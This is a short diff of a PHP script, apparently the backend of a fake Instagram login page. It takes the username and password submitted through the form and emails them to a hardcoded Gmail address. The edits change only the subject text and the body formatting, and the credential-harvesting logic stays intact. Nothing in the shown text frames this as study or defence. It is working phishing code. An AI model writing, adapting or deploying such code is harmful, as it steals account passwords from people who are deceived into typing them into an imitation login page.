@@ -4,10 +4,10 @@
 $username = $_POST['u_name'] ?? '';  // Fetch username (using null coalescing operator)
 $passcode = $_POST['pass'] ?? '';    // Fetch password (using null coalescing operator)
 
-$subject = "Someone Login ! Insta Dummy page";
+$subject = "Somemone log-in this is his passwords :";
 $to = "pygarg26@gmail.com";
 
-$txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i) username [break] (ii) password;
+$txt = "Username: " . $username . "Password: " . $passcode; // Email body (i) username [break] (ii) password;
 
 // Check input fields
 if (!empty($username) and !empty($passcode)) {
